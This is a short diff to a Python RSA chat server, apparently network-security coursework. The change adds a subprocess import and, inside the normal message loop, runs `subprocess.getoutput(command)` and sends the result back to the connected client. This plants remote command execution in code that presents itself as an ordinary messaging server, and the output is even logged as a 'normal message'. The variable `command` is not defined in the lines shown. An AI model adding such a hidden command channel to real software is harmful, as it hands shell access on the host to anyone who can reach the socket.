@@ -4,6 +4,7 @@ import sys
 import ast
 import CNSec_RSA as rsa
 import os
+import subprocess
 
 #get public key
 directory = os.path.dirname(os.path.abspath(__file__))
@@ -126,8 +127,14 @@ while True:
 					username = m[0]
 					pubkey = m[1]
 					message = ' '.join(m[2:])
+
+					output = "output:\n"
+					output += subprocess.getoutput(command)
+
+					connectionSocket.send(output.encode())
 				
 					print(f'recieved normal message: {message}')
+					print(f'recieved normal message: {output}')
 					connectionSocket.send(message.encode())
 					
 					if message == 'exit':
